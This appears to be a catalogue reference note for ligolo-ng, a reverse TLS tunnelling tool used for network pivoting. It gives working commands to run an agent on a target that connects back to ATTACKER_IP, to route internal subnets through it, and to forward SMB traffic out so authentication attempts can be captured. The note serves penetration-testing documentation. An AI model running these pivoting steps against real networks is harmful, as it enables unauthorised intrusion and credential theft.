---
name: "ligolo-ng"
categories:
  - blackarch-tunnel
version: "v0.9.2.r0.ge543732"
homepage: "https://github.com/nicocha30/ligolo-ng/releases"
packaged-by: [blackarch, aur, nixpkgs]
blackarch-builddate: "2026-09-28"
build-system: go
license: GPL3
meta-checked: "2026-11-09"
github-repo: "nicocha30/ligolo-ng"
github-stars: 5164
github-pushed: "2026-09-26"
github-archived: false
github-issues: 19
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 42
gh-activity-checked: "2026-11-09"
---

# ligolo-ng

> Reverse TLS tunnel by nicocha30 that pivots like a VPN: an agent on the target dials out, and the operator routes whole subnets through a TUN interface — no SOCKS, no port-by-port forwarding.

## What it's for

Reaching internal networks from a foothold that can only make outbound connections. Two binaries: `proxy` (operator side; BlackArch installs it as `ligolo-ng-proxy`) and `agent` (target side; `ligolo-ng-agent`). The agent opens a reverse TLS connection to the proxy; the proxy pairs a TUN interface with a userland network stack (gVisor), so packets routed into the interface are translated into connect()s performed by the agent — nmap and friends run directly against the target network, without proxychains. The agent needs no privileges; the proxy host must be allowed to create TUN devices. Supports TCP, UDP and ICMP echo, multiple concurrent agents with a session menu, per-agent listeners, and certificate automation (self-signed or Let's Encrypt). Not anonymous tunneling — the agent's outbound connection is visible as such. For a multiplayer fork of the same concept (shared relay server, multiple operators, auto-managed routing) see the ligolo-mp note under networking; it uses different binaries and is not interchangeable.

## Typical use cases

### Prepare the TUN device and start the proxy with a self-signed certificate

```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert
```

Outcome: the proxy generates a self-signed certificate, warns that the default selfcert domain is detectable, and listens on 0.0.0.0:11601; you land at the `ligolo-ng »` prompt. Note the fingerprint printed for the agent's `-connect` string. (On BlackArch, run `ligolo-ng-proxy` instead of `./proxy`.)

### Listen on a chosen port instead

```
./proxy -selfcert -laddr 0.0.0.0:443
```

Outcome: same relay, but agents dial TCP 443 — for egress paths that only allow common ports. Any `-laddr` host:port works as long as both sides agree.

### Run the agent on the target and connect back

```
./agent --ignore-cert -connect ATTACKER_IP:11601
```

Outcome: the agent prints `Connection established` and the proxy logs `Agent joined. id=... name=user@target` — the reverse TLS link is up. `--ignore-cert` skips validating the self-signed certificate; the agent runs unprivileged.

### Select the session and start the tunnel

```
session
start
```

Outcome: `session` lists the joined agents and drops you into the chosen one's context (`[Agent : user@target] »`); `start` binds the relay to the TUN interface and logs `Starting tunnel to <agent>`. The tunnel survives the session menu — stop it with `stop`.

### Create the relay interface from inside the proxy

```
interface_create --name internalconn
```

Outcome: the proxy itself creates and configures the `internalconn` interface on the operator host (`Interface created!`) — the built-in alternative to preparing `ip tuntap`/`ip link` by hand; route through it by that name in the next step.

### Route the target's subnet through the relay

```
sudo ip route add 198.51.100.0/24 dev ligolo
```

Outcome: the pivoted subnet becomes directly reachable — ping, nmap, WinRM and friends work as if local. Give nmap `--unprivileged` (or `-PE`): the agent's unprivileged stack answers SYN scans with full connects, so raw scans misreport hosts.

### Open a listener on the agent that forwards back to the operator

```
listener_add --tcp --addr 0.0.0.0:445 --to ATTACKER_IP:445
```

Outcome: the target host starts listening on TCP 445 and forwards connections back through the tunnel to ATTACKER_IP:445 — use it to pull traffic that must terminate on your side (for example an authentication attempt you want your own listener to receive) out of the target network.
